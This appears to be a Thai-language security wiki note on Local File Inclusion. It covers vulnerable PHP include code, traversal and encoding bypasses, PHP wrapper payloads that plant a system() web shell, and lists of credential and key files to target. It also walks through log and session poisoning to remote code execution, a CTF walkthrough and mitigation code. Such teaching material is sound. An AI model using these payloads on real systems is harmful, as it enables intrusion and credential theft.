# LFI (Local File Inclusion)

## What
Local File Inclusion (LFI) เป็นช่องโหว่ที่เกิดจากการที่ application อนุญาตให้ผู้ใช้สามารถควบคุม path ของไฟล์ที่จะถูก include เข้ามาในโค้ด โดยไม่มีการตรวจสอบ input ที่เหมาะสม ทำให้ attacker สามารถอ่านไฟล์ใดๆ บนระบบที่ web server มีสิทธิ์เข้าถึงได้

LFI มักพบใน web applications ที่เขียนด้วย PHP, JSP, ASP และภาษาอื่นๆ ที่มีฟังก์ชัน dynamic file inclusion โดยเฉพาะอย่างยิ่งในกรณีที่ใช้ user input เป็นส่วนหนึ่งของ file path

ช่องโหว่นี้สามารถนำไปสู่การเปิดเผยข้อมูลสำคัญ, source code disclosure, และในบางกรณีสามารถ escalate เป็น Remote Code Execution (RCE) ได้

## Landmark
- เว็บที่มี parameter รับค่า filename หรือ page name เช่น `?page=`, `?file=`, `?document=`
- URL patterns เช่น `index.php?page=home`, `view.php?file=document.pdf`
- Error messages ที่แสดง file paths หรือ include errors
- Applications ที่มี dynamic content loading
- Template engines ที่ไม่ปลอดภัย
- File download/view functionalities
- Multi-language websites ที่โหลดภาษาจาก parameter (`?lang=en`)

## Types

### 1. Basic LFI
การโจมตีแบบพื้นฐานที่ไม่มี filter ใดๆ ป้องกัน

```php
<?php
// โค้ดที่มีช่องโหว่ - ไม่มีการตรวจสอบ input
$file = $_GET['page'];
include("/var/www/html/pages/" . $file);
?>
```

**Exploitation:**
```http
# อ่านไฟล์ /etc/passwd
http://target.com/index.php?page=../../../../etc/passwd

# อ่าน configuration files
http://target.com/index.php?page=../../../../var/www/html/config.php

# อ่าน web server logs
http://target.com/index.php?page=../../../../var/log/apache2/access.log
```

### 2. Null Byte Injection (PHP < 5.3.4)
ใช้ null byte (`%00`) เพื่อ bypass file extension ที่ถูกเพิ่มเข้ามา

```php
<?php
// โค้ดพยายามบังคับ extension
$file = $_GET['page'];
include("/var/www/html/pages/" . $file . ".php");
?>
```

**Exploitation:**
```http
# ใช้ null byte truncate extension ที่ตามมา
http://target.com/index.php?page=../../../../etc/passwd%00

# null byte จะทำให้ .php ที่ต่อท้ายถูกตัดทิ้ง
# Final path: /var/www/html/pages/../../../../etc/passwd
```

### 3. Path Truncation
ใช้ path ยาวๆ เพื่อ truncate extension (เก่า PHP versions)

```php
<?php
// โค้ดที่บังคับ extension
$file = $_GET['file'];
include($file . ".php");
?>
```

**Exploitation:**
```http
# ใช้ path ยาวเกิน limit ทำให้ extension ถูกตัด
http://target.com/index.php?file=../../../../etc/passwd././././././././././././[...repeated...]

# หรือใช้ชื่อไฟล์ยาวมาก
http://target.com/index.php?file=../../../../etc/passwd/./././.[repeat 2048+ chars]
```

### 4. Encoding Bypass
ใช้ encoding หลายชั้นเพื่อหลบ filters

```php
<?php
// โค้ดที่ filter ../ แต่ไม่ complete
$file = $_GET['page'];
$file = str_replace("../", "", $file);
include($file);
?>
```

**Exploitation:**
```http
# Double encoding
http://target.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Mixed encoding
http://target.com/index.php?page=..%2f..%2f..%2fetc/passwd

# Nested path traversal
http://target.com/index.php?page=....//....//....//etc/passwd
```

### 5. PHP Wrappers
ใช้ PHP stream wrappers เพื่อขยาย capabilities

```php
<?php
// โค้ดที่มีช่องโหว่ standard LFI
$file = $_GET['file'];
include($file);
?>
```

**Exploitation:**

#### php://filter wrapper
```http
# อ่านไฟล์แบบ base64 encode (bypass execution)
http://target.com/index.php?file=php://filter/convert.base64-encode/resource=config.php

# อ่าน source code โดยไม่ execute
http://target.com/index.php?file=php://filter/read=string.rot13/resource=index.php

# Chain filters
http://target.com/index.php?file=php://filter/convert.iconv.utf-8.utf-16/resource=config.php
```

#### php://input wrapper
```http
# POST data จะถูกนำมา execute
POST /index.php?file=php://input HTTP/1.1
Host: target.com
Content-Length: 18

<?php system($_GET['cmd']); ?>

# จากนั้นเรียก RCE
http://target.com/index.php?file=php://input&cmd=whoami
```

#### data:// wrapper
```http
# Execute PHP code ผ่าน data stream
http://target.com/index.php?file=data://text/plain,<?php system($_GET['cmd']); ?>

# Base64 encoded payload
http://target.com/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# เรียกใช้: &cmd=id
```

#### expect:// wrapper (ต้องติดตั้ง expect extension)
```http
# Execute system commands โดยตรง
http://target.com/index.php?file=expect://id
http://target.com/index.php?file=expect://whoami
```

## Exploitation

### Common Target Files (Linux)

```bash
# System files - ไฟล์ระบบที่มีข้อมูลสำคัญ
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (ต้องมี privileges)
/etc/hosts               # Host mappings
/etc/hostname            # System hostname
/etc/issue               # OS version
/proc/self/environ       # Environment variables
/proc/self/cmdline       # Current process command line
/proc/self/stat          # Process statistics
/proc/self/status        # Process status
/proc/version            # Kernel version

# Web application files - ไฟล์เว็บที่มี sensitive data
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/database.php
/usr/local/apache2/conf/httpd.conf

# Log files - logs ที่อาจมี sensitive information
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog

# SSH keys - private keys สำหรับ lateral movement
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/id_dsa

# Application specific
/var/lib/mlocate/mlocate.db
/var/lib/mysql/mysql/user.MYD
```

### Common Target Files (Windows)

```batch
REM System files - ไฟล์ระบบ Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM

REM IIS files - web server configurations
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log

REM Application files - configuration และ sensitive data
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\wamp\bin\apache\apache2.x.x\conf\httpd.conf
```

### Log Poisoning to RCE

Log poisoning เป็นเทคนิคที่ใช้ LFI ร่วมกับการแทรก PHP code ลงใน log files เพื่อให้ได้ RCE

**ขั้นตอนการโจมตี:**

```bash
# Step 1: ตรวจสอบว่าอ่าน access log ได้หรือไม่
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log"

# Step 2: แทรก PHP code ผ่าน User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target.com/index.php"

# Step 3: เรียกใช้ log file พร้อม execute command
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami"

# Step 4: Execute arbitrary commands
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=cat%20/etc/passwd"
curl "http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=ls%20-la"
```

**Alternative: SSH Log Poisoning**

```bash
# Poison SSH logs ผ่าน username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# อ่าน SSH log ที่ถูก poison
http://target.com/index.php?page=../../../../var/log/auth.log&cmd=id
```

### Session File Poisoning

```php
<?php
// ตัวอย่าง: แทรก PHP code ลงใน session
// เมื่อ session ถูก include จะ execute code
session_start();
$_SESSION['user_data'] = $_GET['data'];
?>
```

**Exploitation:**
```http
# Step 1: Inject PHP code ลง session
http://target.com/profile.php?data=<?php system($_GET['cmd']); ?>

# Step 2: หา session file location (default PHP)
# /var/lib/php/sessions/sess_[PHPSESSID]

# Step 3: Include session file
http://target.com/index.php?page=../../../../var/lib/php/sessions/sess_abc123&cmd=whoami
```

### /proc/self/environ Exploitation

```bash
# อ่าน environment variables
curl "http://target.com/index.php?page=../../../../proc/self/environ"

# Inject PHP code via User-Agent (ถูกเก็บใน HTTP_USER_AGENT)
curl -A "<?php system('cat /etc/passwd'); ?>" "http://target.com/index.php?page=../../../../proc/self/environ"
```

## Protection & Mitigation

### Secure Coding Practices

```php
<?php
// วิธีที่ปลอดภัย - ใช้ whitelist approach
$allowed_pages = array('home', 'about', 'contact', 'products');
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("/var/www/html/pages/" . $page . ".php");
} else {
    include("/var/www/html/pages/error.php");
}

// หรือใช้ basename() เพื่อป้องกัน path traversal
$file = basename($_GET['file']);
include("/var/www/html/pages/" . $file);

// Validate ด้วย realpath() และเช็ค base directory
$base_dir = '/var/www/html/pages/';
$file = $_GET['file'];
$real_path = realpath($base_dir . $file);

if ($real_path && strpos($real_path, $base_dir) === 0) {
    include($real_path);
} else {
    die("Access denied");
}
?>
```

>[!tip] Defense Strategies
>- ใช้ **whitelist** แทน blacklist สำหรับ file inclusion
>- ใช้ `basename()` เพื่อลบ directory traversal sequences
>- Validate input ด้วย `realpath()` และตรวจสอบ base directory
>- ปิด PHP wrappers ที่ไม่จำเป็นใน php.ini (`allow_url_include=Off`)
>- Set appropriate file permissions
>- ใช้ [[WAF (Web Application Firewall)]] เพื่อ detect และ block LFI attempts
>- Implement [[Input Validation]] และ [[Output Encoding]]

>[!warning] Common Mistakes
>- พึ่งพา blacklist filtering (มักถูก bypass ได้)
>- ใช้ `str_replace()` แบบครั้งเดียว (nested traversal bypass)
>- ไม่ validate หลัง canonicalization
>- ลืมปิด `allow_url_include` และ PHP wrappers
>- ไม่ sanitize special characters อย่างเพียงพอ

## CTF Example: File Viewer Challenge

**Scenario:**
เว็บไซต์มี file viewer feature ที่อนุญาตให้ดู documentation files

```php
<?php
// viewer.php - โค้ดที่มีช่องโหว่
$doc = $_GET['doc'];
if (isset($doc)) {
    include("docs/" . $doc . ".txt");
} else {
    echo "Welcome to Documentation Viewer";
}
?>
```

**Attack Path:**

```bash
# Step 1: ทดสอบ basic traversal
curl "http://ctf.example.com/viewer.php?doc=../../etc/passwd"
# Output: file not found (มี .txt ต่อท้าย)

# Step 2: ลอง null byte injection
curl "http://ctf.example.com/viewer.php?doc=../../etc/passwd%00"
# Success! อ่าน /etc/passwd ได้

# Step 3: หา flag location
curl "http://ctf.example.com/viewer.php?doc=../../flag%00"
# flag{lfi_null_byte_still_works_in_old_php}

# Alternative: ใช้ php://filter
curl "http://ctf.example.com/viewer.php?doc=php://filter/convert.base64-encode/resource=../../flag"
# Output: ZmxhZ3tsZmlfbnVsbF9ieXRlX3N0aWxsX3dvcmtzX2luX29sZF9waHB9
# Decode: flag{lfi_null_byte_still_works_in_old_php}
```

## Related Topics
- [[RFI (Remote File Inclusion)]]
- [[Path Traversal]]
- [[XXE (XML External Entity)]]
- [[SSRF (Server-Side Request Forgery)]]
- [[File Upload]]
- [[PHP Security]]
- [[Web Application Security]]
- [[Directory Traversal]]

## Tools
- [[Burp Suite]] - Manual testing and payload fuzzing
- [[OWASP ZAP]] - Automated scanning
- [[ffuf]] - Fuzzing for LFI parameters
- [[Kadimus]] - LFI exploitation framework
- [[dotdotpwn]] - Directory traversal fuzzer

## References
- [[OWASP]] - File Inclusion Vulnerabilities
- [[PayloadsAllTheThings]] - LFI payload collection
- [[HackTricks]] - LFI/RFI techniques

#web #vulnerability #lfi #file-inclusion #php #traversal #rce
